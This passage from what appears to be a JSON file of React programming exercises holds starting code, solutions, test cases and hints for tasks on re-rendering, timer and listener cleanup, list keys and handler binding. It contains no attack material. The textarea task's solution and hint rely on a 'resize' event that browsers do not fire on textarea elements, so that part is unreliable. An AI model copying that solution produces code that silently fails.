          "startingCode": "import React from 'react';\n\nclass ChildComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      localCount: 0\n    };\n  }\n\n  // Optional: Implement shouldComponentUpdate for observation\n  // shouldComponentUpdate(nextProps, nextState) {\n  //   console.log('shouldComponentUpdate called');\n  //   // Return false to prevent re-render unless forceUpdate is called\n  //   return nextProps.parentCount !== this.props.parentCount || nextState.localCount !== this.state.localCount;\n  // }\n\n  handleStateUpdate = () => {\n    // TODO: Update local state to trigger re-render\n  };\n\n  handleForceUpdate = () => {\n    // TODO: Call forceUpdate to trigger re-render\n  };\n\n  render() {\n    console.log('ChildComponent rendered');\n    return (\n      <div style={{ border: '1px solid black', padding: '10px', margin: '10px' }}>\n        <h3>Child Component (Prop: {this.props.parentCount})</h3>\n        <p>Local State Count: {this.state.localCount}</p>\n        <p>Current Timestamp: {new Date().toLocaleTimeString()}</p>\n        <button onClick={this.handleStateUpdate}>Update Local State</button>\n        <button onClick={this.handleForceUpdate}>Force Re-render</button>\n      </div>\n    );\n  }\n}\n\nclass ParentComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      parentCounter: 0\n    };\n  }\n\n  handleParentPropChange = () => {\n    // TODO: Update parent state to change prop passed to child\n  };\n\n  render() {\n    console.log('ParentComponent rendered');\n    return (\n      <div>\n        <h2>Parent Component</h2>\n        <button onClick={this.handleParentPropChange}>Change Parent Prop (Re-renders Child)</button>\n        <ChildComponent parentCount={this.state.parentCounter} />\n      </div>\n    );\n  }\n}\n\n// Usage: <ParentComponent />",
          "solutionCode": "import React from 'react';\n\nclass ChildComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      localCount: 0\n    };\n  }\n\n  shouldComponentUpdate(nextProps, nextState) {\n    console.log('ChildComponent: shouldComponentUpdate called');\n    // Only re-render if parentCount or localCount changes\n    return nextProps.parentCount !== this.props.parentCount || nextState.localCount !== this.state.localCount;\n  }\n\n  handleStateUpdate = () => {\n    console.log('ChildComponent: setState called');\n    this.setState(prevState => ({ localCount: prevState.localCount + 1 }));\n  };\n\n  handleForceUpdate = () => {\n    console.log('ChildComponent: forceUpdate called');\n    this.forceUpdate();\n  };\n\n  render() {\n    console.log('ChildComponent: Render method called');\n    return (\n      <div style={{ border: '1px solid black', padding: '10px', margin: '10px' }}>\n        <h3>Child Component (Prop: {this.props.parentCount})</h3>\n        <p>Local State Count: {this.state.localCount}</p>\n        <p>Current Timestamp: {new Date().toLocaleTimeString()}</p>\n        <button onClick={this.handleStateUpdate}>Update Local State (setState)</button>\n        <button onClick={this.handleForceUpdate}>Force Re-render (forceUpdate)</button>\n      </div>\n    );\n  }\n}\n\nclass ParentComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      parentCounter: 0\n    };\n  }\n\n  handleParentPropChange = () => {\n    console.log('ParentComponent: setState called to update child prop');\n    this.setState(prevState => ({ parentCounter: prevState.parentCounter + 1 }));\n  };\n\n  render() {\n    console.log('ParentComponent: Render method called');\n    return (\n      <div>\n        <h2>Parent Component</h2>\n        <button onClick={this.handleParentPropChange}>Change Parent Prop (Re-renders Child)</button>\n        <ChildComponent parentCount={this.state.parentCounter} />\n      </div>\n    );\n  }\n}\n\n// To use this in a React app:\n// import ReactDOM from 'react-dom';\n// ReactDOM.render(<ParentComponent />, document.getElementById('root'));",
          "testCases": [
            "Click 'Change Parent Prop': Both ParentComponent and ChildComponent should log 'Render method called'. ChildComponent's `parentCount` should increase.",
            "Click 'Update Local State (setState)': Only ChildComponent should log 'Render method called'. ChildComponent's `localCount` should increase.",
            "Click 'Force Re-render (forceUpdate)': Only ChildComponent should log 'Render method called'. If `shouldComponentUpdate` is implemented and returns `false` (for unchanging props/state), 'shouldComponentUpdate called' should NOT appear, but 'Render method called' still should.",
            "Initial render: Both ParentComponent and ChildComponent should log 'Render method called'."
          ],
          "hints": [
            "Remember that `this.setState()` triggers a re-render. You can update a counter.",
            "`this.forceUpdate()` explicitly bypasses `shouldComponentUpdate()` for the component where it's called.",
            "To show prop change, the parent component needs to update its state, which then passes a new prop to the child.",
            "Use `console.log` in `render` and `shouldComponentUpdate` to trace the re-rendering process."
          ],
          "tags": [
            "React",
            "re-render",
            "props",
            "state",
            "setState",
            "forceUpdate",
            "lifecycle",
            "testing"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_class_components",
            "react_state_props",
            "react_lifecycle_methods"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "react_reconciliation",
            "should_component_update"
          ]
        },
        {
          "id": "task_timer_cleanup",
          "title": "Implement a Timer with Cleanup",
          "description": "\nCreate a React class component that displays a countdown timer. The timer should start when the component mounts and stop/clear when the component unmounts.\n\n**Requirements:**\n1.  The component should have a state variable for the countdown `secondsLeft`.\n2.  Use `setInterval` to decrement `secondsLeft` every second.\n3.  Start the timer when the component mounts using `componentDidMount`.\n4.  Crucially, clear the `setInterval` in `componentWillUnmount` to prevent memory leaks.\n5.  Display the remaining seconds in the component.\n6.  Provide a mechanism (e.g., a parent component with a toggle button) to mount and unmount your timer component to test the cleanup functionality.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\n\nclass CountdownTimer extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { secondsLeft: 10 };\n    this.timerId = null; // To store the interval ID\n  }\n\n  // TODO: Implement componentDidMount to start the timer\n\n  // TODO: Implement componentWillUnmount to clear the timer\n\n  render() {\n    return (\n      <div style={{ border: '1px solid blue', padding: '15px', margin: '10px' }}>\n        <h3>Countdown Timer</h3>\n        <p>Time remaining: {this.state.secondsLeft} seconds</p>\n        {this.state.secondsLeft === 0 && <p>Time's Up!</p>}\n      </div>\n    );\n  }\n}\n\nclass App extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { showTimer: true };\n  }\n\n  toggleTimer = () => {\n    this.setState(prevState => ({ showTimer: !prevState.showTimer }));\n  };\n\n  render() {\n    return (\n      <div>\n        <h1>Timer App</h1>\n        <button onClick={this.toggleTimer}>\n          {this.state.showTimer ? 'Hide Timer' : 'Show Timer'}\n        </button>\n        {this.state.showTimer && <CountdownTimer />}\n      </div>\n    );\n  }\n}\n\n// Usage: <App />",
          "solutionCode": "import React from 'react';\n\nclass CountdownTimer extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { secondsLeft: 10 };\n    this.timerId = null; // To store the interval ID\n  }\n\n  componentDidMount() {\n    console.log('CountdownTimer: Component mounted, starting timer.');\n    this.timerId = setInterval(() => {\n      this.setState(prevState => {\n        if (prevState.secondsLeft > 0) {\n          return { secondsLeft: prevState.secondsLeft - 1 };\n        } else {\n          clearInterval(this.timerId);\n          return null; // Stop updating state if already 0\n        }\n      });\n    }, 1000);\n  }\n\n  componentWillUnmount() {\n    if (this.timerId) {\n      clearInterval(this.timerId);\n      console.log('CountdownTimer: Component unmounted, timer cleared.');\n    }\n  }\n\n  render() {\n    return (\n      <div style={{ border: '1px solid blue', padding: '15px', margin: '10px' }}>\n        <h3>Countdown Timer</h3>\n        <p>Time remaining: {this.state.secondsLeft} seconds</p>\n        {this.state.secondsLeft === 0 && <p>Time's Up!</p>}\n      </div>\n    );\n  }\n}\n\nclass App extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { showTimer: true };\n  }\n\n  toggleTimer = () => {\n    this.setState(prevState => ({ showTimer: !prevState.showTimer }));\n  };\n\n  render() {\n    return (\n      <div>\n        <h1>Timer App</h1>\n        <button onClick={this.toggleTimer}>\n          {this.state.showTimer ? 'Hide Timer' : 'Show Timer'}\n        </button>\n        {this.state.showTimer && <CountdownTimer />}\n      </div>\n    );\n  }\n}\n",
          "testCases": [
            "Initial load: Timer should start counting down from 10.",
            "Click 'Hide Timer': The timer should stop, and 'CountdownTimer: Component unmounted, timer cleared.' should be logged to console.",
            "Click 'Show Timer': A new timer should start from 10, and 'CountdownTimer: Component mounted, starting timer.' should be logged.",
            "Observe for long periods: Confirm no memory leaks or errors in console when toggling multiple times.",
            "Allow timer to reach 0: Verify it stops naturally and message changes to 'Time's Up!'. (Although cleanup on unmount is primary goal here)."
          ],
          "hints": [
            "Remember `componentDidMount` for effects that rely on the DOM or need to run once after mount.",
            "`componentWillUnmount` is the place for `clearInterval` or `clearTimeout`.",
            "Store the `setInterval` ID in a class property (e.g., `this.timerId`) so you can access it for clearing.",
            "Use `console.log` in both `componentDidMount` and `componentWillUnmount` to verify when they are called."
          ],
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "componentDidMount",
            "timers",
            "cleanup",
            "state",
            "memory-leaks"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_class_components",
            "react_lifecycle_methods",
            "javascript_timers"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "use_effect_cleanup_hook",
            "resource_management"
          ]
        },
        {
          "id": "task_event_listener_cleanup",
          "title": "Build a Resizable Text Area with Cleanup",
          "description": "\nCreate a React class component that displays the current width of a `<textarea>` element and updates this width as the user resizes the textarea. Crucially, ensure that the resize event listener is properly attached and removed.\n\n**Requirements:**\n1.  A class component that renders a `<textarea>` element.\n2.  The component's state should hold the current width of the textarea.\n3.  Attach a `resize` event listener to the `textarea` element when the component mounts. This listener should update the state with the new width.\n4.  Remove the `resize` event listener when the component unmounts using `componentWillUnmount`.\n5.  Display the current width prominently above the textarea.\n6.  (Challenge) Implement `componentDidUpdate` to re-attach the listener if the textarea ref changes (e.g., due to conditional rendering or some other change), though for this simple case, `componentDidMount`/`componentWillUnmount` suffice if the ref is stable.\n",
          "difficulty": "hard",
          "startingCode": "import React from 'react';\n\nclass ResizableTextArea extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { textareaWidth: 0 };\n    this.textareaRef = React.createRef(); // Create a ref for the textarea\n  }\n\n  handleTextAreaResize = () => {\n    if (this.textareaRef.current) {\n      this.setState({ textareaWidth: this.textareaRef.current.offsetWidth });\n    }\n  };\n\n  // TODO: Implement componentDidMount to attach the event listener\n\n  // TODO: Implement componentWillUnmount to remove the event listener\n\n  render() {\n    return (\n      <div style={{ padding: '20px' }}>\n        <h3>Resizable Textarea</h3>\n        <p>Current Textarea Width: {this.state.textareaWidth}px</p>\n        <textarea\n          ref={this.textareaRef}\n          style={{\n            width: '300px',\n            height: '100px',\n            resize: 'both',\n            overflow: 'auto',\n            border: '1px solid grey',\n          }}\n        ></textarea>\n      </div>\n    );\n  }\n}\n\n// For testing cleanup, use a parent component to conditionally render:\n/*\nclass App extends React.Component {\n  state = { showTextarea: true };\n  render() {\n    return (\n      <div>\n        <button onClick={() => this.setState(prev => ({ showTextarea: !prev.showTextarea }))}>\n          Toggle Textarea\n        </button>\n        {this.state.showTextarea && <ResizableTextArea />}\n      </div>\n    );\n  }\n}\n*/",
          "solutionCode": "import React from 'react';\n\nclass ResizableTextArea extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { textareaWidth: 0 };\n    this.textareaRef = React.createRef(); // Create a ref for the textarea\n  }\n\n  handleTextAreaResize = () => {\n    if (this.textareaRef.current) {\n      const newWidth = this.textareaRef.current.offsetWidth;\n      // Only update if width actually changed to avoid unnecessary re-renders\n      if (newWidth !== this.state.textareaWidth) {\n        this.setState({ textareaWidth: newWidth });\n      }\n    }\n  };\n\n  componentDidMount() {\n    console.log('ResizableTextArea: Mounted, attaching listener.');\n    // Attach the event listener to the textarea element itself\n    if (this.textareaRef.current) {\n      this.textareaRef.current.addEventListener('resize', this.handleTextAreaResize);\n      // Set initial width\n      this.setState({ textareaWidth: this.textareaRef.current.offsetWidth });\n    }\n  }\n\n  componentWillUnmount() {\n    console.log('ResizableTextArea: Unmounting, removing listener.');\n    // Remove the event listener\n    if (this.textareaRef.current) {\n      this.textareaRef.current.removeEventListener('resize', this.handleTextAreaResize);\n    }\n  }\n\n  // Challenge: If the ref itself could change (e.g., conditional rendering affecting the element)\n  // componentDidUpdate(prevProps, prevState) {\n  //   if (this.textareaRef.current && this.textareaRef.current !== this.prevTextareaRef.current) {\n  //     // If ref changed, remove listener from old and add to new\n  //     if (this.prevTextareaRef.current) {\n  //       this.prevTextareaRef.current.removeEventListener('resize', this.handleTextAreaResize);\n  //     }\n  //     this.textareaRef.current.addEventListener('resize', this.handleTextAreaResize);\n  //   }\n  //   this.prevTextareaRef.current = this.textareaRef.current; // Store current ref for next update\n  // }\n\n  render() {\n    return (\n      <div style={{ padding: '20px' }}>\n        <h3>Resizable Textarea</h3>\n        <p>Current Textarea Width: {this.state.textareaWidth}px</p>\n        <textarea\n          ref={this.textareaRef}\n          style={{\n            width: '300px',\n            height: '100px',\n            resize: 'both',\n            overflow: 'auto',\n            border: '1px solid grey',\n            boxSizing: 'border-box' // Important for predictable sizing\n          }}\n          placeholder=\"Try resizing me!\"\n        ></textarea>\n      </div>\n    );\n  }\n}\n\n// Parent component for testing unmount\nclass App extends React.Component {\n  state = { showTextarea: true };\n  render() {\n    return (\n      <div>\n        <h1>Resizable Textarea Demo</h1>\n        <button onClick={() => this.setState(prev => ({ showTextarea: !prev.showTextarea }))}>\n          {this.state.showTextarea ? 'Hide Textarea' : 'Show Textarea'}\n        </button>\n        {this.state.showTextarea && <ResizableTextArea />}\n      </div>\n    );\n  }\n}\n\n// Usage: <App />",
          "testCases": [
            "Initial load: Textarea should appear, and initial width displayed.",
            "Resize textarea manually: The displayed width should update in real-time.",
            "Click 'Hide Textarea': Component should unmount, 'ResizableTextArea: Unmounting, removing listener.' should be logged, and no width updates should occur if you resize the window (as the listener should be gone).",
            "Click 'Show Textarea': Component should mount again, 'ResizableTextArea: Mounted, attaching listener.' should be logged, and resizing should work again.",
            "Rapid toggling: No memory leaks or warnings/errors should appear in the console over prolonged testing."
          ],
          "hints": [
            "To attach an event listener directly to a DOM element managed by React, you'll need to use a React Ref (`React.createRef()` and `ref={this.myRef}` attribute).",
            "The DOM element will be available in `this.myRef.current` inside `componentDidMount`.",
            "Remember to call `removeEventListener` in `componentWillUnmount`.",
            "The `resize` event on `textarea` is specifically for when the user drags the resize handle, not when the window resizes. If you want window resize, attach to `window`.",
            "Consider adding `box-sizing: border-box` to your textarea CSS for more predictable sizing if issues arise."
          ],
          "tags": [
            "React",
            "lifecycle",
            "componentDidMount",
            "componentWillUnmount",
            "refs",
            "event-listeners",
            "DOM",
            "cleanup",
            "memory-leaks"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "react_class_components",
            "react_refs",
            "react_lifecycle_methods",
            "javascript_event_listeners"
          ],
          "complexity": 8,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "imperative_react",
            "custom_hooks_for_dom_interaction"
          ]
        },
        {
          "id": "task_list_rendering_keys",
          "title": "Implement a Todo List with Correct Keys",
          "description": "\nCreate a React component that renders a dynamic list of todo items. The list should allow adding new items and removing existing ones. Ensure proper usage of `key` props to avoid reconciliation issues.\n\n**Requirements:**\n1.  A functional or class component (`TodoList`) that manages a list of todo items in its state.\n2.  Each todo item should have a unique ID (e.g., generated using `Date.now()` or a UUID library) and a `task` string.\n3.  Render the list using `Array.prototype.map()`.\n4.  Assign a stable and unique `key` prop to each list item, using the item's unique ID.\n5.  Implement an 'Add Todo' button that adds a new todo item to the list.\n6.  Implement a 'Remove' button next to each todo item to remove it from the list.\n7.  (Optional) Add a text input to add custom todo tasks.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\nfunction TodoList() {\n  const [todos, setTodos] = useState([\n    { id: 1, task: 'Learn React Hooks' },\n    { id: 2, task: 'Master JavaScript' },\n    { id: 3, task: 'Build a Portfolio' },\n  ]);\n\n  const addTodo = (text = 'New Todo') => {\n    // TODO: Add a new todo with a unique ID and the given text\n  };\n\n  const removeTodo = (idToRemove) => {\n    // TODO: Remove the todo item with the given ID\n  };\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h2>My Todo List</h2>\n      <input type=\"text\" placeholder=\"Add a new todo\" />\n      <button onClick={() => addTodo()}>Add Todo</button>\n      <ul>\n        {todos.map((todo) => (\n          // TODO: Ensure correct key usage here\n          <li>\n            {todo.task}\n            <button onClick={() => removeTodo(todo.id)}>Remove</button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n\n// Usage: <TodoList />",
          "solutionCode": "import React, { useState } from 'react';\n\nfunction TodoList() {\n  const [todos, setTodos] = useState([\n    { id: 1, task: 'Learn React Hooks' },\n    { id: 2, task: 'Master JavaScript' },\n    { id: 3, task: 'Build a Portfolio' },\n  ]);\n\n  const [newTodoText, setNewTodoText] = useState('');\n\n  const addTodo = () => {\n    if (newTodoText.trim() === '') return; // Prevent adding empty todos\n    const newTodo = { id: Date.now(), task: newTodoText.trim() }; // Use Date.now() for unique ID\n    setTodos([...todos, newTodo]);\n    setNewTodoText(''); // Clear input after adding\n  };\n\n  const removeTodo = (idToRemove) => {\n    setTodos(todos.filter(todo => todo.id !== idToRemove));\n  };\n\n  return (\n    <div style={{ padding: '20px', maxWidth: '400px', margin: '0 auto', border: '1px solid #ccc', borderRadius: '8px' }}>\n      <h2>My Todo List</h2>\n      <div style={{ display: 'flex', gap: '10px', marginBottom: '20px' }}>\n        <input\n          type=\"text\"\n          placeholder=\"Add a new todo\"\n          value={newTodoText}\n          onChange={(e) => setNewTodoText(e.target.value)}\n          style={{ flexGrow: 1, padding: '8px' }}\n        />\n        <button onClick={addTodo} style={{ padding: '8px 15px' }}>Add Todo</button>\n      </div>\n      <ul style={{ listStyleType: 'none', padding: 0 }}>\n        {todos.map((todo) => (\n          // Correct Key Usage: using item.id ensures stable identity\n          <li key={todo.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 0', borderBottom: '1px dashed #eee' }}>\n            <span>{todo.task}</span>\n            <button onClick={() => removeTodo(todo.id)} style={{ background: '#ff4d4d', color: 'white', border: 'none', padding: '5px 10px', borderRadius: '4px', cursor: 'pointer' }}>Remove</button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n",
          "testCases": [
            "Initial render: Three todo items should be displayed correctly.",
            "Add a new todo: A new item should appear at the end of the list. Verify its input field is clear.",
            "Add multiple todos: All new items should be added correctly and appear in the list.",
            "Remove a todo from the middle: The correct item should be removed, and the remaining items should retain their integrity (e.g., if you had an input field, its value should stay with the correct item).",
            "Add/Remove multiple times: Verify no warnings about keys or unexpected behavior in the console.",
            "Add an empty todo: Should not add an empty todo item."
          ],
          "hints": [
            "Use `Date.now()` or a simple incrementing counter for generating unique IDs for new items.",
            "Remember that `key` is a special prop directly on the JSX element in the `map`'s return.",
            "The `filter` array method is useful for removing items from a list in an immutable way.",
            "Make sure your `addTodo` function creates a *new* array for the state update, not mutates the existing one."
          ],
          "tags": [
            "React",
            "lists",
            "keys",
            "state-management",
            "functional-components",
            "best-practices",
            "CRUD"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_state_hooks",
            "javascript_array_methods",
            "react_component_rendering"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "react_reconciliation",
            "immutability"
          ]
        },
        {
          "id": "task_dynamic_list_keys",
          "title": "Visualize Key Effects on Component State",
          "description": "\nCreate a React component that vividly demonstrates the importance of using stable, unique keys (vs. array index) when list items can change order or be removed/added. The goal is to show how internal component state (like an input value) can be incorrectly associated with the wrong item if keys are misused.\n\n**Requirements:**\n1.  A parent component that manages a list of objects in its state. Each object should have a unique `id` and a `value` (e.g., initial text).\n2.  Render each list item as a separate child component. Each child component should contain an `<input type='text'>` whose value is managed internally by the child component's state, initialized from its `value` prop.\n3.  Provide two versions of the list rendering: one using `item.id` as the key, and one using `index` as the key. You can toggle between them or render both side-by-side.\n4.  Include a button to 'Reverse Order' of the list items.\n5.  Include a button to 'Remove First Item'.\n6.  Crucially, interact with the input fields (type some text) *before* reversing or removing items. Observe and explain the behavior difference between the correctly keyed list and the incorrectly keyed list.\n",
          "difficulty": "hard",
          "startingCode": "import React, { useState } from 'react';\n\n// Child component with internal state (input value)\nclass ListItem extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { inputValue: props.initialValue };\n  }\n\n  handleChange = (e) => {\n    this.setState({ inputValue: e.target.value });\n  };\n\n  render() {\n    return (\n      <li style={{ padding: '5px', border: '1px solid #ccc', marginBottom: '5px' }}>\n        ID: {this.props.id}, Initial Value: {this.props.initialValue} &nbsp;\n        <input type=\"text\" value={this.state.inputValue} onChange={this.handleChange} />\n      </li>\n    );\n  }\n}\n\nfunction KeyDemonstrator() {\n  const initialItems = [\n    { id: 'uuid1', value: 'First Item' },\n    { id: 'uuid2', value: 'Second Item' },\n    { id: 'uuid3', value: 'Third Item' },\n  ];\n  const [items, setItems] = useState(initialItems);\n\n  const reverseItems = () => {\n    setItems([...items].reverse());\n  };\n\n  const removeFirstItem = () => {\n    setItems(items.slice(1));\n  };\n\n  return (\n    <div style={{ display: 'flex', justifyContent: 'space-around', padding: '20px' }}>\n      <div>\n        <h3>Correct Keys (item.id)</h3>\n        <button onClick={reverseItems}>Reverse Order</button>\n        <button onClick={removeFirstItem}>Remove First</button>\n        <ul>\n          {items.map(item => (\n            <ListItem key={item.id} id={item.id} initialValue={item.value} />\n          ))}\n        </ul>\n      </div>\n\n      <div>\n        <h3>Incorrect Keys (index)</h3>\n        {/* TODO: Render a duplicate list but with index as key */}\n        <button onClick={reverseItems}>Reverse Order</button>\n        <button onClick={removeFirstItem}>Remove First</button>\n        <ul>\n          {initialItems.map((item, index) => (\n            // This list needs to be independent for demonstration.\n            // You might need a separate state for itemsWithBadKeys\n            // or duplicate the state management logic.\n            <ListItem key={index} id={item.id} initialValue={item.value} />\n          ))}\n        </ul>\n      </div>\n    </div>\n  );\n}\n\n// Usage: <KeyDemonstrator />",
          "solutionCode": "import React, { useState } from 'react';\n\n// Child component with internal state (input value)\nclass ListItem extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { inputValue: props.initialValue };\n    console.log(`ListItem ${props.id} (key: ${props.reactKey}): Constructor, initialValue=${props.initialValue}`);\n  }\n\n  // This method will be called if the component instance is *reused* but props change\n  static getDerivedStateFromProps(nextProps, prevState) {\n    // console.log(`ListItem ${nextProps.id} (key: ${nextProps.reactKey}): getDerivedStateFromProps, nextProps.initialValue=${nextProps.initialValue}`);\n    // In this specific demo, we want to see state *stick* to the wrong item if keys are bad.\n    // So we avoid updating internal state from props here, as it would mask the key issue.\n    return null;\n  }\n\n  componentWillUnmount() {\n    console.log(`ListItem ${this.props.id} (key: ${this.props.reactKey}): Will Unmount`);\n  }\n\n  render() {\n    console.log(`ListItem ${this.props.id} (key: ${this.props.reactKey}): Render, inputValue=${this.state.inputValue}`);\n    return (\n      <li style={{ padding: '5px', border: '1px solid #ccc', marginBottom: '5px', backgroundColor: this.props.bgColor || 'white' }}>\n        <span>ID: {this.props.id} </span>\n        <input type=\"text\" value={this.state.inputValue} onChange={this.handleChange} style={{ marginLeft: '10px' }} />\n      </li>\n    );\n  }\n\n  handleChange = (e) => {\n    this.setState({ inputValue: e.target.value });\n  };\n}\n\nfunction KeyDemonstrator() {\n  const initialItems = [\n    { id: 'uuid1', value: 'First Item', color: '#e0ffe0' },\n    { id: 'uuid2', value: 'Second Item', color: '#ffe0e0' },\n    { id: 'uuid3', value: 'Third Item', color: '#e0e0ff' },\n  ];\n\n  // Separate state for each list to allow independent manipulation for demo clarity\n  const [goodKeyItems, setGoodKeyItems] = useState(initialItems);\n  const [badKeyItems, setBadKeyItems] = useState(initialItems);\n\n  const reverseItemsGood = () => {\n    setGoodKeyItems([...goodKeyItems].reverse());\n  };\n\n  const removeFirstItemGood = () => {\n    setGoodKeyItems(goodKeyItems.slice(1));\n  };\n\n  const reverseItemsBad = () => {\n    setBadKeyItems([...badKeyItems].reverse());\n  };\n\n  const removeFirstItemBad = () => {\n    setBadKeyItems(badKeyItems.slice(1));\n  };\n\n  return (\n    <div style={{ display: 'flex', justifyContent: 'space-around', padding: '20px' }}>\n      <div style={{ border: '1px solid green', padding: '15px', borderRadius: '8px' }}>\n        <h3>Correct Keys (item.id)</h3>\n        <p>Type into inputs, then reverse/remove. Values stay with correct item.</p>\n        <button onClick={reverseItemsGood} style={{ marginRight: '10px' }}>Reverse Order</button>\n        <button onClick={removeFirstItemGood}>Remove First</button>\n        <ul style={{ listStyleType: 'none', padding: 0 }}>\n          {goodKeyItems.map(item => (\n            <ListItem key={item.id} reactKey={item.id} id={item.id} initialValue={item.value} bgColor={item.color} />\n          ))}\n        </ul>\n      </div>\n\n      <div style={{ border: '1px solid red', padding: '15px', borderRadius: '8px' }}>\n        <h3>Incorrect Keys (index)</h3>\n        <p>Type into inputs, then reverse/remove. Values 'jump' to wrong item.</p>\n        <button onClick={reverseItemsBad} style={{ marginRight: '10px' }}>Reverse Order</button>\n        <button onClick={removeFirstItemBad}>Remove First</button>\n        <ul style={{ listStyleType: 'none', padding: 0 }}>\n          {badKeyItems.map((item, index) => (\n            // Passing index as reactKey prop for logging, but key prop is actual index\n            <ListItem key={index} reactKey={index} id={item.id} initialValue={item.value} bgColor={item.color} />\n          ))}\n        </ul>\n      </div>\n    </div>\n  );\n}\n",
          "testCases": [
            "Initial render: Both lists should display the initial items with their values.",
            "Good Keys Test: For the 'Correct Keys' list, type distinct text into each input (e.g., 'A1', 'B2', 'C3'). Click 'Reverse Order'. Observe that the typed text remains associated with its original item (e.g., 'A1' still with 'uuid1'). Click 'Remove First'. 'A1' (uuid1) should be removed, and 'B2' (uuid2) should move to the top, still displaying 'B2'.",
            "Bad Keys Test: For the 'Incorrect Keys' list, type distinct text into each input (e.g., 'X1', 'Y2', 'Z3'). Click 'Reverse Order'. Observe that the typed text 'jumps' to the wrong item (e.g., the input that displayed 'X1' now displays 'Z3'). Click 'Remove First'. The input values will shift incorrectly.",
            "Console logs: Observe constructor/render/unmount logs to see which `ListItem` instances are created/destroyed/reused for each key strategy.",
            "Edge case: Try adding items (if extending the task) and observe behavior."
          ],
          "hints": [
            "Create a separate state for the 'bad keys' list so its manipulation doesn't affect the 'good keys' list.",
            "The child `ListItem` component needs its own internal state (`inputValue`) to truly demonstrate the state preservation issue.",
            "Use `console.log` in the `ListItem`'s constructor, `render` method, and `componentWillUnmount` to visualize when instances are created, re-rendered, or destroyed. This will be very insightful for understanding how keys affect reconciliation.",
            "Remember that `key` is a special prop and is not passed to `this.props`. If you want to display the key value in the `ListItem` for debugging, pass it as a separate prop (e.g., `reactKey={index}`)."
          ],
          "tags": [
            "React",
            "keys",
            "lists",
            "reconciliation",
            "state-preservation",
            "performance",
            "best-practices",
            "visualization"
          ],
          "timeEstimate": 120,
          "prerequisites": [
            "react_state_hooks",
            "react_class_components",
            "javascript_array_methods",
            "react_component_lifecycle"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "virtual_dom",
            "diffing_algorithm",
            "component_identity"
          ]
        },
        {
          "id": "task_input_handler_binding",
          "title": "Implement an Input Component with Correct Binding",
          "description": "\nCreate a React class component that manages an input field's value. Ensure that the input's `onChange` handler is correctly bound to the component instance.\n\n**Requirements:**\n1.  A class component named `ControlledInput`.\n2.  The component should have a state variable, e.g., `inputValue`, initialized to an empty string.\n3.  Render an `<input type=\"text\">` element.\n4.  The input's `value` prop should be controlled by `this.state.inputValue`.\n5.  Implement an `onChange` handler method (`handleInputChange`) that updates `this.state.inputValue` using `this.setState()`.\n6.  Bind `handleInputChange` to `this` using the constructor binding method.\n7.  Display the current input value next to the input field.\n",
          "difficulty": "easy",
          "startingCode": "import React from 'react';\n\nclass ControlledInput extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      inputValue: ''\n    };\n    // TODO: Bind handleInputChange here\n  }\n\n  handleInputChange(event) {\n    // TODO: Update state with input value\n  }\n\n  render() {\n    return (\n      <div style={{ padding: '20px' }}>\n        <h3>Controlled Input Demo (Class Component)</h3>\n        <input\n          type=\"text\"\n          // TODO: Set value and onChange props\n        />\n        <p>Current Value: </p>\n      </div>\n    );\n  }\n}\n\n// Usage: <ControlledInput />",
          "solutionCode": "import React from 'react';\n\nclass ControlledInput extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      inputValue: ''\n    };\n    // Correct binding in the constructor\n    this.handleInputChange = this.handleInputChange.bind(this);\n  }\n\n  handleInputChange(event) {\n    // 'this' is correctly bound to the component instance\n    this.setState({ inputValue: event.target.value });\n  }\n\n  render() {\n    return (\n      <div style={{ padding: '20px', border: '1px solid #ddd', borderRadius: '8px', maxWidth: '400px', margin: '0 auto' }}>\n        <h3>Controlled Input Demo (Class Component)</h3>\n        <input\n          type=\"text\"\n          value={this.state.inputValue} // Controlled component\n          onChange={this.handleInputChange} // Bound handler\n          style={{ padding: '8px', width: 'calc(100% - 16px)', marginBottom: '10px' }}\n          placeholder=\"Type something here...\"\n        />\n        <p>Current Value: <strong>{this.state.inputValue}</strong></p>\n      </div>\n    );\n  }\n}\n",
          "testCases": [
            "Initial render: Input field should be empty, displayed value should be empty.",
            "Typing in input: As you type, the displayed value should update character by character.",
            "Check console: Ensure no `this` context errors (`TypeError: Cannot read properties of undefined (reading 'setState')`) are logged.",
            "Clear input: Value should correctly become empty."
          ],
          "hints": [
            "Remember that `this.setState()` is how you update state in a class component.",
            "The `onChange` event object provides `event.target.value` to get the current input value.",
            "The `bind(this)` method creates a new function where `this` is permanently set to the provided argument.",
            "The constructor is executed only once when the component is created, making it an efficient place for binding."
          ],
          "tags": [
            "React",
            "class-components",
            "event-handlers",
            "binding",
            "this-context",
            "forms",
            "state"
          ],
          "timeEstimate": 30,
          "prerequisites": [
